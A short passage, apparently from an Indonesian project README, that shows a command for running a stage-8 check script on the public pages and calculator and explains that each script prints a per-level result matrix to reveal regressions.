python scripts/stage8_check.py   # halaman publik, kalkulator
```

Setiap skrip mencetak matriks hasil per level sehingga regresi langsung terlihat.
